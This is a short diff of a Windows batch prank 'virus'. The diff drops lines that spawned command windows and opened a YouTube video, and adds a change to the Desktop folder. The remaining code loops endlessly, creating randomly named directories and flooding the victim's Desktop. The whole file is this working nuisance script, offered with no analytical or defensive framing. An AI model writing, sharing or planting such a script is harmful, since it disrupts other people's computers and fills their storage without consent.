@@ -1,7 +1,6 @@
 @echo off
 title Uh oh, is this a VIRUS!!???
+cd Desktop
 :a
-start cmd
-start https://www.youtube.com/watch?v=MuRWnnCA_WA
 md %random%
 goto :a
